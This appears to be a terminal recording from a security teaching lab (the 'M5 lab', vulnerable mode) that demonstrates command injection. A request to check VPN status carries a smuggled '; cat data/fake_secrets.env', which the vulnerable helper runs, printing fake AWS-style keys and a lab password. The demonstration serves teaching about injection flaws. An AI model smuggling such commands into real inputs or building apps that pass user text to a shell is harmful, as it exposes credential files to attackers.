[56.440609, "o", "--- M5 lab · VULNERABLE mode · stand-in model (stand_in_model.py, not AI) ---\r\n\r\n[SHELL] you> check the status of vpn; cat data/fake_secrets.env\r\n"]
[56.440791, "o", "    log: INFO command run: \"/usr/bin/python3\" tools/service_status.py vpn; cat data/fake_secrets.env\r\n"]
[56.457601, "o", "    helper output: VPN gateway: OK (fake data) | # FAKE values for the M5 lab. Nothing here works anywhere. The app should never show this file to a user. | # AKIAIOSFODNN7EXAMPLE is the example key from the AWS IAM documentation. | DB_PASSWORD=lab-only-not-a-real-password | AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\r\n    RESULT: EXPLOITED - an extra command read data/fake_secrets.env\r\n\r\n1 of 1 attack changed what the app did.\r\n"]
